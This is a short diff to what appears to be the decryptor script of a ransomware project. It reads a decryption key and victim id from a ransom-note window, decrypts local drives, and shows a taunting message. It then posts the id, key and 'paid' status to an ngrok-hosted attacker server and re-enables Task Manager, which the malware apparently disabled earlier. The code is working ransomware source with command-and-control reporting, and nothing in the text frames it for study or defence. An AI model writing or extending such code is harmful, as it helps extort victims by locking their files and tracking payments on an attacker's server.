@@ -2,6 +2,8 @@ from DecryptionView import DecryptionView, pop_up
 from CryptoManager import CryptoManager
 import os, sys
 
+TRIALDIR_PATH = r"C:\Users\Marqu\Downloads"
+
 if __name__ == '__main__':
     cm = CryptoManager()
     
@@ -14,6 +16,7 @@ if __name__ == '__main__':
         try:
             event, values = ransom_note.note.read()
             key = values[0]
+            id = values[1]
 
             if cm.correct_key(key):
                 local_drives = cm.get_local_drives()
@@ -42,5 +45,5 @@ if __name__ == '__main__':
     pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
 
     # TODO insert id
-    cm.send_post_request(url='http://6e5eca4e96f6.ngrok.io', mode='update', state='paid')
+    cm.send_post_request(url='http://9ca31b80390f.ngrok.io', id=id, key=key, mode='update', state='paid')
     cm.enable_task_manager()
